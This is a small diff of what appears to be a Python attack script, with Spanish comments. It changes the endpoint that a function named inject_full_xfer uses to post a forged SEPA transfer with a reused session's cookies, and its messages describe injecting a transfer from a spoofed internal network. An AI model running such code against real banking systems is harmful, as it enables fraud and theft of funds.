@@ -61,7 +61,7 @@ def inject_full_xfer():
     s.cookies.update(cookies)
 
     print("[+] Inyectando transferencia desde red falsificada interna")
-    xfer_response = s.post(f"http://{HOST}:9181/api/transferencia/", json=transfer_data)
+    xfer_response = s.post(f"http://{HOST}:9181/api/send-transfer", json=transfer_data)
     print("Estado de transfer SEPA:", xfer_response.status_code)
     print("Respuesta:", xfer_response.text)
 
